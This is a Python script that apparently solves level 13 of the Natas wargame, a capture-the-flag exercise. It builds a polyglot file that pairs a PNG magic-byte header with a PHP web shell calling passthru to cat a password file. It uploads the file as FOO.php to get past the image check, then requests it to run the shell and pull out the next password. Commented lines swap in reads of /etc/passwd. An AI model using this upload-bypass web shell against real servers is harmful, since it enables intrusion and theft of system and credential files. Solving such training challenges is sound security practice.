import re
import Auther
import os
# https://www.garykessler.net/library/file_sigs_GCK_latest.html
PNG = bytes.fromhex("89 50 4E 47 0D 0A 1A 0A".replace(" ", ""))
# Write bytes require binary writing mode
with open("natas13_upload.png", "wb") as f:
    f.write(PNG)
    f.write(
        f'<?php print passthru("cat {Auther.authPathOnServer(14)}"); ?>'.encode())
    # f'<?php print passthru("cat /etc/passwd"); ?>'.encode())

    # f'<?php print passthru("php --version"); ?>'.encode())
    # This will get
    # PHP 7.4.33 (cli) (built: Jul  3 2025 16:41:49) ( NTS )
    # Copyright (c) The PHP Group
    # Zend Engine v3.4.0, Copyright (c) Zend Technologies
    #     with Zend OPcache v7.4.33, Copyright (c), by Zend Technologies


def findFileName(text: str):
    pattern = re.compile(r'<a href="(.*)">.*has been uploaded')
    return next((m[1] for line in text.splitlines() if (m := pattern.search(line))), None)


# And binary reading mode
with open("natas13_upload.png", "rb") as f:
    response = Auther.request(13, data={
        "filename": "FOO.php"
    }, files={
        "uploadedfile": f
    })
    if name := findFileName(response.text):
        r = Auther.request(13, name, "GET").text
        # print(r)
        Auther.passwordLineGetter(r, 14)()
os.remove("natas13_upload.png")
